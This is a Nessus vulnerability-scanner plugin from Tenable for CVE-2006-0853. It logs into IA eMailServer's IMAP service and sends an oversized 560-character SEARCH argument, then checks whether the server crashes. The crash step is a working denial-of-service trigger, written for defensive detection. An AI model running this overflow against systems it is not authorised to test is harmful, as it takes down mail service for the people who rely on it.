#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20960);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2006-0853");
  script_bugtraq_id(16744);
  script_osvdb_id(23377);

  script_name(english:"IA eMailServer IMAP SEARCH Command Remote Overflow");
  script_summary(english:"Checks for search command buffer overflow vulnerability in IA eMailServer's IMAP server");

 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is susceptible to buffer overflow attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running IA eMailServer, a commercial messaging
system for Windows. 

The IMAP server bundled with the version of IA eMailServer installed
on the remote host crashes when it receives a SEARCH command argument
of 560 or more characters.  An authenticated attacker could exploit
this issue to crash the service and possibly to execute arbitrary code
remotely. 

Note that IA eMailServer can be configured to run as a service with
LOCAL SYSTEM privileges, although this is not the default." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/425586/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/20");
 script_cvs_date("$Date: 2011/03/11 21:52:34 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
  script_category(ACT_DENIAL);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");
  script_dependencies("find_service1.nasl", "imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner and make sure it looks like IA eMailServer.
s = recv_line(socket:soc, length:1024);
if (
  !strlen(s) || 
  "* OK True North Software IMAP4rev1 Server" >!< s
) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, select the INBOX.
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " SELECT inbox");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # If successful, try to exploit the flaw to crash the server.
  if (resp && resp =~ "OK") {
    ++tag;
    resp = NULL;
    c = string("nessus", string(tag), " SEARCH ", crap(560));
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
    }

    # If it looks like it might be vulnerable...
    if ("SEARCH command has unrecognized key" >< s) {
      # nb: the server doesn't crash right away.
      tries = 5;
      for (iter=1; iter <= tries; iter++) {
        sleep(5);
        soc2 = open_sock_tcp(port);
        if (soc2) s2 = recv_line(socket:soc, length:2048);

        # Consider it a problem if we get two consecutive failures 
        # to establish a connection or read the banner.
        if (soc2 && strlen(s2)) {
          if (failed) break;
        }
        else failed++;

        if (failed > 1) {
          security_warning(port);
          exit(0);
        }
        close(soc2);
      }
    }
  }
}
else if (resp =~ "BAD" || resp =~ "NO") {
  debug_print("couldn't login with supplied IMAP credentials!", level:1);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
